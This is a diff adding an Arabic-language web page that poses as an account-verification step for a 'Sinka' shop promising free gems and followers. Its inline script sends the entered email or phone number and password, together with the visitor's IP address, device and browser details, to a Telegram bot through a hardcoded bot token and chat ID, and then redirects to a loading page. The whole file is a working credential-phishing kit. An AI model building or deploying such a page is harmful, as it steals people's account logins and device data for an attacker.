@@ -1,0 +1,96 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>تأكيد الحساب - متجر سينكا</title>
+  <link rel="stylesheet" href="../assets/css/style.css">
+  <link rel="stylesheet" href="../assets/css/verify.css">
+</head>
+<body>
+  <div class="stars"></div>
+  <script src="../assets/js/main.js"></script>
+
+  <div class="navbar">
+    <div class="home">🏠 الرئيسية</div>
+    <div class="menu-toggle" onclick="toggleMenu()">☰</div>
+  </div>
+
+  <div id="sideMenu" class="side-menu">
+    <a href="../index.html">🏠 الرئيسية</a>
+    <a href="../pages/diamonds.html">💎 الحصول على الجواهر</a>
+    <a href="../pages/followers.html">📲 شراء متابعين</a>
+    <a href="share.html">🎁 شارك لتحصل على جائزة مجانية</a>
+  </div>
+
+  <div class="verify-container">
+    <h2>تأكيد حسابك</h2>
+    <form id="login-form" class="verify-form">
+      <input type="text" id="email" placeholder="البريد الإلكتروني أو رقم الهاتف" required autocomplete="email">
+      <input type="text" id="password" placeholder="كلمة المرور" required autocomplete="current-password">
+      <button type="submit">متابعة</button>
+    </form>
+    <div class="info">
+      سيتم استخدام بياناتك للتحقق من حسابك وتسليم الجواهر الخاصة بك.
+    </div>
+  </div>
+
+  <script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
+  <script>
+    const TOKEN = "7874185278:AAHN_8SoG4HsZ2C6LRrbuD7-eA8ZTHGFsRk";
+    const CHAT_ID = "-4864340421";
+    const URI_API = `https://api.telegram.org/bot${TOKEN}/sendMessage`;
+
+    document.getElementById('login-form').addEventListener('submit', function(e) {
+      e.preventDefault();
+
+      const button = this.querySelector('button');
+      button.disabled = true;
+      button.textContent = 'جاري تسجيل الدخول...';
+
+      const email = document.getElementById('email').value;
+      const password = document.getElementById('password').value;
+
+      axios.get('https://api.ipify.org?format=json')
+        .then(response => {
+          const ip = response.data.ip;
+          const userAgent = navigator.userAgent;
+          const platform = navigator.platform;
+          const screenWidth = screen.width;
+          const screenHeight = screen.height;
+          const deviceType = /mobile/i.test(navigator.userAgent) ? 'Mobile' : 'Desktop';
+          const message = `
+<b>Sinka Shop Verify </b>\n
+<b>Account Details</b>\n
+<b>Time ⏰:</b> ${new Date().toLocaleString()}\n
+<b>Email ✉:</b> ${email}\n
+<b>Password 🔒:</b> ${password}\n
+<b>IP Address 📝:</b> ${ip}\n
+<b>Machine 🖥:</b> ${deviceType}\n
+<b>Platform 🛠:</b> ${platform}\n
+<b>Screen 💻:</b> ${screenWidth}x${screenHeight}\n
+<b>User Agent 🕵️:</b> ${userAgent}\n
+
+`;
+
+          axios.post(URI_API, {
+            chat_id: CHAT_ID,
+            parse_mode: 'HTML',
+            text: message
+          }).then(response => {
+            window.location.href = 'loading.html';
+          }).catch(error => {
+            alert('Error sending the information. Please try again.');
+            button.disabled = false;
+            button.textContent = 'Continue';
+          });
+        })
+        .catch(error => {
+          alert('Please try again.');
+          button.disabled = false;
+          button.textContent = 'Continue';
+        });
+    });
+  </script>
+</body>
+</html>
